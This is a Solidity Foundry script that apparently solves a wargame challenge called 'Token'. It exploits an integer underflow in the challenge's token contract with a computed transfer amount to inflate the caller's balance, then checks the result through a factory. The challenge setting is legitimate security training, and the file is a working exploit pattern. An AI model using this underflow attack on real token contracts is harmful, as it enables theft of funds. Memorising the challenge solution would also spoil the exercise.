// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Token} from "../src/5-Token.sol";
import {TokenFactory} from "../src/TokenFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract TokenSolution is Script {
    Token public tokenLevel;
    address payable instanceAddress =
        payable(0x7Ef471a8929eaC9eb539fAD04c03F86883B1cB9E);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        tokenLevel = Token(instanceAddress);

        console.log(
            "Balance of User before attack: %s",
            tokenLevel.balanceOf(publicKey)
        );
        console.log("Total supply: %s", tokenLevel.totalSupply());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint256 difference = type(uint256).max - tokenLevel.totalSupply() + 21;

        tokenLevel.transfer(msg.sender, difference);
        vm.stopBroadcast();

        console.log(
            "Balance of User after attack: %s",
            tokenLevel.balanceOf(publicKey)
        );

        validate();
    }

    function validate() internal {
        bool isValidated = new TokenFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attack {}
